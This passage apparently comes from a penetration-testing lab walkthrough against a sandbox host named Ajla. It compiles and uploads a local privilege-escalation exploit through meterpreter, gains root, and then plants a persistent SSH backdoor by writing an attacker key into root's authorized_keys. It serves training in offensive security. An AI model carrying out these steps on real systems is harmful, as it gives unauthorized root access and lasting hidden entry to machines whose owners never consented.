First, copy exploit to home dir so we don't alter original:
Kali>
`cp /usr/share/exploitdb/exploits/linux/local/45010.c ./`

Then compile according to instructions:
`gcc 45010.c -o 45010`

Upload with meterpreter to Ajla:
meterpreter>
`upload /home/kali/45010 /tmp/`

Run the exploit:
meterpreter>
`shell`
`cd /tmp`
`chmod +x 45010`
`./45010`
`whoami`
root

Boom. We are now root. 

We can create a more stable backdoor using SSH incase our meterpreter session dies. 

***
If you already have ssh keys generated, feel free to skip this step.
***

Generate a new SSH key on Kali:
Kali >
`ssh-keygen`
`cat:~/.ssh/id_rsa.pub`

With our ssh key generated, we can create the authorized_keys file on Ajla to accept our public key. 

We will do this via the meterpreter session that has the root shell:
meterpreter>

Make directory:
`mkdir /root/.ssh`

Add keys to authorized_keys file:
`echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali" > /root/.ssh/authorized_keys`

Connect to Ajla directly with Kali:
Kali >
`ssh root@sandbox.local`
...
root@ajla:~#